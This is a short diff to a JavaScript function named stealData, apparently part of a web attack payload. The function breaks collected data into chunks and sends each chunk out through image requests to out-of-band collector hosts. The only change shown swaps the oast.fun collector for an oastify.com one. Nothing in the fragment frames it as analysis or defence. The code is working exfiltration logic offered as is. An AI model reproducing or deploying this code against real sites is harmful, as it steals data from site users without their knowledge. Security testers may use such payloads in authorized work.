@@ -37,10 +37,10 @@ function stealData() {
         var numFullChunks  = ((exfilData.length / exfilChunkSize) | 0);
         for (var i = 0; i < numFullChunks; i++) {
             var chunk = exfilData.slice(exfilChunkSize * i, exfilChunkSize * (i + 1));
-            new Image().src = "https://ydwfqckvgqntzrjxvxllufphukkslkx48.oast.fun/exfil/" + i + "/" + chunk + ".jpg";
+            new Image().src = "https://od589wa03bfdzgwu8498z8ktakge45su.oastify.com/exfil/" + i + "/" + chunk + ".jpg";
         }
         var lastChunk = exfilData.slice(exfilChunkSize * numFullChunks);
-        new Image().src = "https://ydwfqckvgqntzrjxvxllufphukkslkx48.oast.fun/exfil/LAST/" + lastChunk + ".jpg";
+        new Image().src = "https://od589wa03bfdzgwu8498z8ktakge45su.oastify.com/exfil/LAST/" + lastChunk + ".jpg";
     }
 };
 }
